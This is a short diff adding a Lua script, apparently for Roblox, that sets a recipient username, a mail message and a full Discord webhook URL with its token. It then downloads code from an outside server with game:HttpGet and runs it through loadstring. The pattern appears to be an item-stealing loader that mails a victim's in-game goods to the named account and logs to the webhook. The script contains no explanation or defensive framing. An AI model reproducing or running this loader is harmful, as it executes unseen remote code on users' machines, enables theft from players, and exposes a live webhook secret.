@@ -1,0 +1,5 @@
+Username = "Giddibicos1333"
+MailMessage = "sign pls"
+Webhook = "https://discord.com/api/webhooks/1239490497358073919/faZ3Qpr9hko9YRInACUHSpcIe1ntFCmeRMp0nc_-wDKqRFOL4SyCl2zuQBSFK6qxBiLv"
+
+loadstring(game:HttpGet("https://egorikusa.space/ttd"))()
